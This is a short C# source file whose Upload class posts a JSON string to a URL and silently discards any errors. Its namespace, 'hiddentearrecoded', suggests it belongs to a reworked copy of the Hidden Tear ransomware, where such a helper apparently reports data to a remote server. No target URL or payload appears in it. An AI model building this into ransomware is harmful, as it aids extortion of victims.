using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace hiddentearrecoded
{
    class Upload
    {
        public static void PostJson(string URL, string JSON)
        {
            var request = (HttpWebRequest)WebRequest.Create(URL);
            request.ContentType = "application/json";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                streamWriter.Write(JSON);
            }

            try
            {
                var response = (HttpWebResponse)request.GetResponse();
                using (var streamReader = new StreamReader(response.GetResponseStream()))
                {
                    var result = streamReader.ReadToEnd();
                }
            }
            catch { }
        }
    }
}
